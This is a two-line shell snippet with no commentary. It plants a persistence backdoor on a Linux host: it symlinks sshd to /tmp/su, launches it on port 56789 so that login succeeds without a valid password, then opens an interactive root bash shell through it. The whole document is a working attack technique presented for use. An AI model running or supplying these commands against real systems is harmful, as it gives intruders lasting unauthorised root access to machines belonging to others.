```shell
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=56789
ssh -T root@ip -p 56789 /bin/bash -i
```
